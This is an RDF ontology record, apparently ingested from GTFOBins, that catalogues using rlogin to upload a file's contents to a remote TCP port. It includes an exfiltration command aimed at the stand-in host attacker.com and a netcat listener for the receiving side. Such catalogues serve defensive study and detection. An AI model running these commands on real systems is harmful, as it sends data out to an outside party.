mknd:command_rlogin-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rlogin-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """Send contents of a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker system to capture the contents.

`rlogin` hangs waiting for the remote peer to close the socket.

The file is corrupted by leading and trailing spurious data.
""" ;
    d3f:uses mknd:executable_rlogin ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rlogin ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
""" .

